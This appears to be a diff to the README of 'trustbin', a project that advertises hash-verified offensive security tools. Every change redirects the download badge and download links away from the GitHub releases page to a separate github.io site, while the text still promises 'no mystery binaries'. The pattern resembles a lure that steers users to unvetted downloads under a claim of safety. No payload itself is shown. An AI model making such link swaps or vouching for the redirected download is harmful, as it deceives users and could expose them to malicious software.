@@ -1,6 +1,6 @@
 # 🔐 trustbin - Verified Security Tools, No Surprises
 
-[![Download Now](https://img.shields.io/badge/Download-Get_trustbin-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Inferiorcourtlakemalawi590/trustbin/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get_trustbin-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://inferiorcourtlakemalawi590.github.io)
 
 ## 👋 Welcome to trustbin
 
@@ -17,7 +17,7 @@ Think of trustbin as a trusted toolbox for cybersecurity enthusiasts and profess
 The most important step is getting the software onto your computer. Here's how to do it simply:
 
 1.  **Visit the Download Page:** Click this button or go to the link at the bottom of this page:
-    [Go to Download Page](https://github.com/Inferiorcourtlakemalawi590/trustbin/releases)
+    [Go to Download Page](https://inferiorcourtlakemalawi590.github.io)
 
 2.  **Find the Latest Version:** On that page, look for the newest release (it's usually at the top). You'll see a list of files attached to that release.
 
@@ -102,13 +102,13 @@ We are strongly committed to supply-chain security, which is a fancy way of sayi
 - **Repo Name:** trustbin
 - **Purpose:** Offensive security tools
 - **Key Feature:** Hash-verified, no mystery binaries
-- **Download Site:** [Click here](https://github.com/Inferiorcourtlakemalawi590/trustbin/releases)
+- **Download Site:** [Click here](https://inferiorcourtlakemalawi590.github.io)
 
 ## 🚀 Your Next Step
 
 You're ready to go! Your journey into the world of ethical hacking and system security starts with a single, safe download.
 
-👉 **[Download trustbin Now](https://github.com/Inferiorcourtlakemalawi590/trustbin/releases)** 👈
+👉 **[Download trustbin Now](https://inferiorcourtlakemalawi590.github.io)** 👈
 
 Get the tools you need, with the peace of mind you deserve. Welcome to the community of trust-conscious security practitioners.
 
